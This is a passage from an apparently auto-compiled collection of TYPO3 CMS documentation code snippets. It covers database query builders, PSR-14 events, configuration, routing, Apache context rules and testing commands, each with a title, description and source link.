queueIdentifier=\"tx_myvendor_customqueue\" />\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Page Types in TYPO3 (PHP)\nDESCRIPTION: This code reference indicates where additional page types can be registered in TYPO3. The PageDoktypeRegistry is used to manage custom page types, allowing developers to extend TYPO3's page type functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\DataHandling\\PageDoktypeRegistry\n```\n\n----------------------------------------\n\nTITLE: Configuring Composer for Patches\nDESCRIPTION: JSON configuration for composer.json that defines where to apply patches. This example shows how to configure a patch for the TYPO3 core with exit-on-failure option enabled.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n\"extra\": {\n  \"typo3/cms\": {\n    \"web-dir\": \"public\"\n  },\n  \"composer-exit-on-patch-failure\": true,\n  \"patches\": {\n    \"typo3/cms-core\": {\n      \"Bug #98106 fix something\":\"patches/Bug-98106.diff\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::right() in TYPO3 Repository (PHP)\nDESCRIPTION: Illustrates the usage of the right() function in a TYPO3 repository to extract characters from the right side of a string. It demonstrates creating a SELECT statement that includes the rightmost characters of a field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_15\n\nLANGUAGE: PHP\nCODE:\n```\npublic function findRightValues(): array\n{\n    $queryBuilder = $this->connectionPool->getQueryBuilderForTable('my_table');\n    $queryBuilder\n        ->select('uid')\n        ->addSelect(\n            $queryBuilder->expr()->right(\n                'some_field',\n                5\n            ),\n            'right_value'\n        )\n        ->from('my_table');\n\n    return $queryBuilder->executeQuery()->fetchAllAssociative();\n}\n```\n\n----------------------------------------\n\nTITLE: RST Directive for TYPO3 Documentation\nDESCRIPTION: ReStructuredText directives for including common elements and setting up documentation structure for TYPO3 extension update guide.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index:: Extension development; Update\n.. _update-extension:\n\n============================================\nUpdate your extension for new TYPO3 versions\n============================================\n\nThe following tools are helpful when updating your extension:\n\n..  toctree::\n    :titlesonly:\n\n    ExtensionScanner\n    UpdateWizards/Index\n```\n\n----------------------------------------\n\nTITLE: Using ModifyIconForResourcePropertiesEvent in TYPO3\nDESCRIPTION: Reference to the PSR-14 event class that allows modification of resource icons and overlays in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/ModifyIconForResourcePropertiesEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\ModifyIconForResourcePropertiesEvent\n```\n\n----------------------------------------\n\nTITLE: Configuring Session Backend in TYPO3 CMS\nDESCRIPTION: Example configuration for setting up a file-based session backend in TYPO3 CMS. This snippet demonstrates how to configure the backend session storage location and class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/Sessions/_SessionManager.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['session'] => [\n    'BE' => [\n        'backend' => \\TYPO3\\CMS\\Core\\Session\\Backend\\FileSessionBackend::class,\n        'savePath' => '/var/www/t3sessionframework/data/'\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Implementing getContentArgumentName for Inline Syntax Support (PHP)\nDESCRIPTION: Example of implementing the getContentArgumentName method in a GravatarViewHelper to support inline syntax and content arguments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_9\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/_GravatarTagBasedViewHelper_getContentArgumentName.php\n    :language: php\n    :caption: EXT:my_extension/Classes/ViewHelpers/GravatarViewHelper.php  (Example 3, with content arguments)\n    :linenos:\n```\n\n----------------------------------------\n\nTITLE: Referencing Record Object Class in PHP\nDESCRIPTION: Shows the PHP class path for TYPO3's Record objects, which provide an object-oriented representation of database records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DatabaseRecords/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Domain\\Record\n```\n\n----------------------------------------\n\nTITLE: Correct Conditional Structure in PHP\nDESCRIPTION: Demonstrates the proper layout for if-elseif-else conditions, addressing the avoidance of 'else if' in TYPO3 PHP code.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\nif ($this->processSubmission) {\n    // Process submission here\n} elseif ($this->internalError) {\n    // Handle internal error\n} else {\n    // Something else here\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing FilterMenuItemsEvent in PHP\nDESCRIPTION: This snippet shows the namespace and class name for the FilterMenuItemsEvent, as well as two of its key methods for getting and setting filtered menu items.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/FilterMenuItemsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\Event\\FilterMenuItemsEvent\n```\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Frontend\\Event\\FilterMenuItemsEvent::getFilteredMenuItems()\n```\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Frontend\\Event\\FilterMenuItemsEvent::setFilteredMenuItems()\n```\n\n----------------------------------------\n\nTITLE: Registering Extbase Plugin Configuration\nDESCRIPTION: Complete example of registering and configuring an Extbase plugin with extension utility methods\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/NamingConventions.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility;\n\nExtensionUtility::configurePlugin(\n    'Examples',\n    'HtmlParser',\n    [\n        \\T3docs\\Examples\\Controller\\HtmlParserController::class => 'index',\n    ],\n    ExtensionUtility::PLUGIN_TYPE_CONTENT_ELEMENT,\n);\n```\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_examples_htmlparser {\n  settings.pageId = 42\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Extended File Utility Class Reference\nDESCRIPTION: Class path definition for TYPO3's ExtendedFileUtility which handles file operations. Used for processing file commands and triggering related events.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Events.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\File\\ExtendedFileUtility\n```\n\n----------------------------------------\n\nTITLE: Running Unit Tests Using Shell Script\nDESCRIPTION: This segment provides a shell command to execute unit tests using the 'runTests.sh' script. It illustrates how to initiate unit tests within a TYPO3 environment, offering options to increase verbosity for detailed test outputs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nBuild/Scripts/runTests.sh\n```\n\n----------------------------------------\n\nTITLE: Using AfterFolderRenamedEvent Event Reference\nDESCRIPTION: Demonstrates the PSR-14 event that fires after a folder is renamed in TYPO3. This event is used for custom folder processing and synchronizing folder relations in system records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFolderRenamedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: Events; AfterFolderRenamedEvent\n..  _AfterFolderRenamedEvent:\n```\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFolderRenamedEvent\n```\n\n----------------------------------------\n\nTITLE: Declaring Extension Configuration Options\nDESCRIPTION: Demonstrates the syntax for declaring extension configuration options in `ext_conf_template.txt`.  It uses comments to define the category, type, and label for each option, similar to TypoScript constants. The label can be a localized string using LLL syntax.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtConfTemplate.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n\"# cat=Login; type=string; label=Logo: If set, this logo will be used instead of...\\nloginLogo =\"\n```\n\nLANGUAGE: typoscript\nCODE:\n```\n\"# cat=Login; type=string; label=LLL:EXT:my_extension_key/Resources/Private/Language/locallang_be.xlf:loginLogo\\nloginLogo =\"\n```\n\n----------------------------------------\n\nTITLE: getByEnglishName() Method\nDESCRIPTION: Retrieves a country object based on its English name. The method accepts the English name of the country as a string and returns the corresponding `Country` object, or null if no match is found.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryProvider.rst.txt#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getByEnglishName(string $name)\n        :returns: `?\\TYPO3\\CMS\\Core\\Country\\Country`\n\n        :param $name: the name\n```\n\n----------------------------------------\n\nTITLE: Defining Environment-Specific Configuration in PHP for TYPO3\nDESCRIPTION: This PHP code snippet shows an example of defining environment-specific configuration directly in a PHP file for a TYPO3 project. It includes settings for database connection, mail configuration, and encryption key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/EnvironmentConfiguration.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$_ENV['TYPO3_CONTEXT'] = 'Development';\n$_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_HOST'] = '127.0.0.1';\n$_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_PORT'] = 3306;\n$_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_USER'] = 'typo3';\n$_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_PASS'] = 'password';\n$_ENV['TYPO3_DB_CONNECTIONS_DEFAULT_NAME'] = 'typo3_db';\n\n$_ENV['TYPO3_MAIL_TRANSPORT'] = 'smtp';\n$_ENV['TYPO3_MAIL_TRANSPORT_SMTP_SERVER'] = 'localhost:1025';\n\n$_ENV['TYPO3_ENCRYPTIONKEY'] = 'ab4cb84d7c140e0f3cd76533554b371c0708c745f7a90f23be68d26bbb0a1ecc';\n```\n\n----------------------------------------\n\nTITLE: Using castVarchar Method in TYPO3 ExpressionBuilder Class\nDESCRIPTION: Documentation for the castVarchar method of the ExpressionBuilder class. This method casts a value to VARCHAR with a specified length and optional alias. It returns a database platform-compatible cast expression.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderCastVarchar.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ncastVarchar(string $value, int $length = 255, string $asIdentifier = '')\n```\n\n----------------------------------------\n\nTITLE: Setting Metadata Record in AfterFileMetaDataCreatedEvent in PHP\nDESCRIPTION: Method to modify or replace the metadata record. Accepts an array parameter containing the updated metadata that will be stored in the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMetaDataCreatedEvent.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\npublic function setRecord(array $record)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Base URL in TYPO3\nDESCRIPTION: Shows how to get the base URL using site configuration instead of TSFE global variable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/TSFE/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n/** @var \\TYPO3\\CMS\\Core\\Site\\Entity\\Site $site */\n$site = $request->getAttribute('site');\n/** @var array $siteConfiguration */\n$siteConfiguration = $site->getConfiguration();\n$baseUrl = $siteConfiguration['base'];\n```\n\n----------------------------------------\n\nTITLE: Disabling all logging in TYPO3\nDESCRIPTION: This snippet demonstrates how to disable all logging in TYPO3 by unsetting the LOG configuration in TYPO3_CONF_VARS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Configuration/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n// disable all logging\nunset($GLOBALS['TYPO3_CONF_VARS']['LOG']);\n```\n\n----------------------------------------\n\nTITLE: getAll() Method\nDESCRIPTION: This method retrieves all countries. It returns an array of `Country` objects representing all available countries in the system. No parameters are required for this method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryProvider.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getAll()\n        :returns: `\\Country[]`\n```\n\n----------------------------------------\n\nTITLE: Configuring PageType Decorator in TYPO3 TypoScript\nDESCRIPTION: This TypoScript configuration sets up different page types for default, RSS feed, and JSON views. It defines the content and headers for each page type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\npage = PAGE\npage.typeNum = 0\npage.10 = TEXT\npage.10.value = Default page\n\nrssfeed = PAGE\nrssfeed.typeNum = 13\nrssfeed.10 < plugin.tx_myplugin\nrssfeed.config.disableAllHeaderCode = 1\nrssfeed.config.additionalHeaders.10.header = Content-Type: xml/rss\n\njsonview = PAGE\njsonview.typeNum = 26\njsonview.config.disableAllHeaderCode = 1\njsonview.config.additionalHeaders.10.header = Content-Type: application/json\njsonview.10 = USER\njsonview.10.userFunc = MyVendor\\MyExtension\\Controller\\JsonPageController->renderAction\n```\n\n----------------------------------------\n\nTITLE: Deprecated Connection-Specific Middleware Registration in TYPO3\nDESCRIPTION: Shows the deprecated way of registering a Doctrine DBAL driver middleware for a specific connection, which should be migrated to the new sortable configuration schema.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// This is deprecated in TYPO3 v13\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['driverMiddlewares'] = [\n    'my-middleware' => \\Vendor\\Extension\\Driver\\MyDriverMiddleware::class,\n];\n```\n\n----------------------------------------\n\nTITLE: Event Delegation with JavaScript Event API in TYPO3\nDESCRIPTION: Shows how to implement event delegation where an event listener is called for any matching element inside a bound parent element. The example uses a RegularEvent to listen for clicks on elements matching a specific selector.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/EventApi/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport RegularEvent from '@typo3/core/event/regular-event.js';\n\nnew RegularEvent('click', function(e) {\n  // Your code\n}).delegateTo(document, 'a[data-action=\"toggle\"]');\n```\n\n----------------------------------------\n\nTITLE: Core Configuration Schema for TYPO3 Hooks\nDESCRIPTION: Example schema for defining hooks in the $GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS'] configuration space, which is used for TYPO3 Core script hooks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Hooks/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['<main_key>']['<sub_key>'][<index>] = <function_reference>\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Application Context in Apache\nDESCRIPTION: Apache configuration examples showing how to set TYPO3 application contexts either using a static value or dynamically based on host headers using mod_rewrite or setenvif modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Bootstrapping.rst#2025-04-16_snippet_2\n\nLANGUAGE: apacheconf\nCODE:\n```\n# In your Apache configuration (either .htaccess or vhost)\n# you can either set context to static value with:\nSetEnv TYPO3_CONTEXT Development\n\n# Or set context depending on current host header\n# using mod_rewrite module\nRewriteCond %{HTTP_HOST} ^dev\\.example\\.com$\nRewriteRule .? - [E=TYPO3_CONTEXT:Development]\n\nRewriteCond %{HTTP_HOST} ^staging\\.example\\.com$\nRewriteRule .? - [E=TYPO3_CONTEXT:Production/Staging]\n\nRewriteCond %{HTTP_HOST} ^www\\.example\\.com$\nRewriteRule .? - [E=TYPO3_CONTEXT:Production]\n\n# or using setenvif module\nSetEnvIf Host \"^dev\\.example\\.com$\" TYPO3_CONTEXT=Development\nSetEnvIf Host \"^staging\\.example\\.com$\" TYPO3_CONTEXT=Production/Staging\nSetEnvIf Host \"^www\\.example\\.com$\" TYPO3_CONTEXT=Production\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeRecordLanguageOverlayEvent Class in PHP\nDESCRIPTION: This snippet defines the BeforeRecordLanguageOverlayEvent class in the TYPO3\\CMS\\Core\\Domain\\Event namespace. The class provides methods to get and set record data, table name, and language aspects before a record is language overlaid.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeRecordLanguageOverlayEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Domain\\Event;\n\nclass BeforeRecordLanguageOverlayEvent\n{\n    public function getTable(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getRecord(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setRecord(array $record)\n    {\n        // Implementation not shown\n    }\n\n    public function getLanguageAspect(): \\TYPO3\\CMS\\Core\\Context\\LanguageAspect\n    {\n        // Implementation not shown\n    }\n\n    public function setLanguageAspect(\\TYPO3\\CMS\\Core\\Context\\LanguageAspect $languageAspect)\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating from ExtensionManagementUtility::getFileFieldTCAConfig to Direct Configuration\nDESCRIPTION: Shows how to migrate from the deprecated ExtensionManagementUtility::getFileFieldTCAConfig method to directly configuring a file field in TCA, including setting image type restrictions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Tca.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n// Before\n'columns' => [\n    'image' => [\n        'label' => 'My image',\n        'config' => \\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::getFileFieldTCAConfig(\n            'image',\n            [\n                'maxitems' => 6,\n            ],\n            $GLOBALS['TYPO3_CONF_VARS']['GFX']['imagefile_ext']\n        ),\n    ],\n],\n\n// After\n'columns' => [\n    'image' => [\n        'label' => 'My image',\n        'config' => [\n            'type' => 'file',\n            'maxitems' => 6,\n            'allowed' => 'common-image-types'\n        ],\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Simple Route Enhancer Configuration in YAML\nDESCRIPTION: Example configuration for a simple route enhancer that maps category and tag parameters to URL segments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  ForgotPassword:\n    type: Plugin\n    limitToPages: [13]\n    routePath: '/forgot-password/{user}/{hash}'\n    namespace: 'tx_felogin_pi1'\n    defaults:\n      forgot: '1'\n    requirements:\n      user: '[0-9]{1,3}'\n      hash: '^[a-zA-Z0-9]{32}$'\n```\n\n----------------------------------------\n\nTITLE: Accessing Frontend User Authentication in TYPO3 CMS PHP Service\nDESCRIPTION: This snippet demonstrates how to retrieve the FrontendUserAuthentication object from a ServerRequestInterface object in a TYPO3 CMS service class. It shows the process of accessing the frontend.user attribute and using it to fetch group data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendUser.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse TYPO3\\CMS\\Frontend\\Authentication\\FrontendUserAuthentication;\n\npublic function doSomethingToFrontendUser(ServerRequestInterface $request): void\n{\n    /** @var FrontendUserAuthentication $frontendUserAuthentification */\n    $frontendUserAuthentification = $request->getAttribute('frontend.user');\n    $frontendUserAuthentification->fetchGroupData($request);\n    // do something\n}\n```\n\n----------------------------------------\n\nTITLE: Using Visibility Aspect in TYPO3 PHP Controller\nDESCRIPTION: Demonstrates how to use the Visibility aspect to check if hidden pages, content, or deleted records should be displayed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Context\\Context;\n\nclass MyController\n{\n    protected Context $context;\n\n    public function __construct(Context $context)\n    {\n        $this->context = $context;\n    }\n\n    public function myAction(): void\n    {\n        $showHiddenPages = $this->context->getPropertyFromAspect('visibility', 'includeHiddenPages');\n        $showHiddenContent = $this->context->getPropertyFromAspect('visibility', 'includeHiddenContent');\n        $showDeletedRecords = $this->context->getPropertyFromAspect('visibility', 'includeDeletedRecords');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Understanding the $GLOBALS Array in PHP for TYPO3 Configuration\nDESCRIPTION: This snippet outlines the structure of the PHP $GLOBALS array within TYPO3, which manages global configurations such as TCA, system-wide settings, and user settings. It serves as a centralized point for accessing these configurations, with specific paths documented for each configuration category.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/ConfigurationOverview.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS\n   ├── $GLOBALS['TCA'] = \"TCA\"\n   ├── GLOBALS['TYPO3_CONF_VARS'] = \"Global configuration\"\n   │   ├── GLOBALS['TYPO3_CONF_VARS']['EXTENSIONS'] = \"Extension configuration\"\n   │   └── GLOBALS['TYPO3_CONF_VARS']['SYS']['features'] = \"Feature Toggles\"\n   └── $GLOBALS['TYPO3_USER_SETTINGS'] = \"User settings\"\n   └── ...\n```\n\n----------------------------------------\n\nTITLE: Running Functional Tests with SQLite in TYPO3 Projects using DDEV\nDESCRIPTION: Bash command to run functional tests using SQLite database driver in a DDEV environment for TYPO3 projects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_7\n\nLANGUAGE: Bash\nCODE:\n```\nddev exec \\\n    typo3DatabaseDriver=pdo_sqlite \\\n    php vendor/bin/phpunit -c Build/phpunit/FunctionalTests.xml\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Addon for TYPO3 Code Editor (PHP)\nDESCRIPTION: This snippet shows how to register a custom addon for the TYPO3 code editor. It defines the addon's identifier, module, CSS files, options, and applicable modes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CodeEditor/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'my/addon' => [\n        'module' => 'my/addon/Module',\n        'cssFiles' => [\n            'my/addon/Css/File1.css',\n            'my/addon/Css/File2.css',\n        ],\n        'options' => [\n            'option1' => true,\n            'option2' => 'value',\n        ],\n        'modes' => ['xml', 'html'],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Defining concat() Method in TYPO3 ExpressionBuilder Class - PHP\nDESCRIPTION: Method signature for the concat() function that creates database-compatible concatenation expressions. Takes variable number of string arguments and returns a concatenation expression compatible with the current database platform.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderConcat.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function concat(string ...$parts): string\n```\n\n----------------------------------------\n\nTITLE: Setting Default Asynchronous Transport in TYPO3 Configuration\nDESCRIPTION: PHP configuration to route all messages to the asynchronous doctrine transport. This is typically set in the TYPO3 configuration files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['messenger']['routing']['*'] = 'doctrine';\n```\n\n----------------------------------------\n\nTITLE: Loading MultiStepWizard JavaScript Module in Form Engine\nDESCRIPTION: Example of how to add a JavaScript module to a field within the Form Engine using JavaScriptModuleInstruction to load the MultiStepWizard implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/MultiStepWizard.rst#2025-04-16_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n$resultArray['javaScriptModules'][] = JavaScriptModuleInstruction::create(\n    '@stefanfroemken/dropbox/AccessTokenModule.js'\n)->instance($fieldId);\n```\n\n----------------------------------------\n\nTITLE: Importing CSV Dataset in PHP for TYPO3 Functional Test\nDESCRIPTION: Demonstrates how to import a CSV dataset in a functional test using different file path options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$this->importCSVDataSet(__DIR__ . '/../../Fixtures/be_users.csv');\n$this->importCSVDataSet('PACKAGE:some_extension/Resources/Private/Database/TestFixtures.csv');\n$this->importCSVDataSet('EXT:core/Tests/Functional/Fixtures/pages.csv');\n```\n\n----------------------------------------\n\nTITLE: Run Acceptance Tests with Codeception in DDEV Container\nDESCRIPTION: This shell command demonstrates executing the Codeception acceptance test suite within the DDEV PHP container. It ensures the suite is run with necessary configurations specified in the 'codeception.yml' file, providing feedback on test success or failure.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Acceptance.rst#2025-04-16_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nlolli@apoc /var/www/local/site-introduction $ ddev exec bin/codecept run acceptance -d -c Tests/codeception.yml\n```\n\n----------------------------------------\n\nTITLE: Implementing ChattyInterface for Upgrade Wizard Output\nDESCRIPTION: Example implementation of ChattyInterface to generate output during upgrade wizard execution using Symfony's OutputInterface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/UpdateWizards/Creation.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\n\nclass DatabaseUpdatedPrerequisite implements PrerequisiteInterface, ChattyInterface\n{\n    /**\n     * @var OutputInterface\n     */\n    protected $output;\n\n    public function setOutput(OutputInterface $output): void\n    {\n        $this->output = $output;\n    }\n\n    public function ensure(): bool\n    {\n        $adds = $this->upgradeWizardsService->getBlockingDatabaseAdds();\n        $result = null;\n        if (count($adds) > 0) {\n            $this->output->writeln('Performing ' . count($adds) . ' database operations.');\n            $result = $this->upgradeWizardsService->addMissingTablesAndFields();\n        }\n        return $result === null;\n    }\n\n    // ... more logic\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyEditFormUserAccessEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement a listener for the ModifyEditFormUserAccessEvent in TYPO3 CMS. It shows how to modify user access to edit forms based on custom conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyEditFormUserAccessEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse 